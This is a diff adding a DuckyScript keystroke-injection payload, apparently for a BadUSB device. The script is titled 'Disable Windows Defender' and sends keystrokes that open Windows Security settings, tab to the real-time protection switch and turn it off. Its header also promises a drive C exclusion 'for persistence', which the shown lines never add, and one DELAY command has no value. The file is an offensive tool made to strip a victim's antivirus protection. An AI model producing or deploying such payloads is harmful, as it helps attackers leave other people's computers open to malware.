@@ -1,0 +1,32 @@
+REM Title: Disable Windows Defender
+REM Author: Zero_Sploit (v1.0)
+REM Updated: B33m0 (v1.1)
+REM Updated: UberGuidoZ (v1.2)
+REM Description: Opens security settings, disabled Defender, then adds an exception of drive C for persistence
+REM Target: Windows 10/11 (Powershell)
+REM Version: 1.2
+
+REM Pause for everything to recognize and be ready
+DELAY 2000
+
+REM Open Windows Defender Settings
+GUI r
+DELAY 750
+STRING windowsdefender:
+DELAY 
+ENTER
+
+REM Navigate to Manage Settings
+DELAY 10000
+ENTER
+DELAY 100
+TAB
+TAB
+TAB
+TAB
+DELAY 500
+ENTER
+DELAY 500
+SPACE
+DELAY 500
+ALT F4
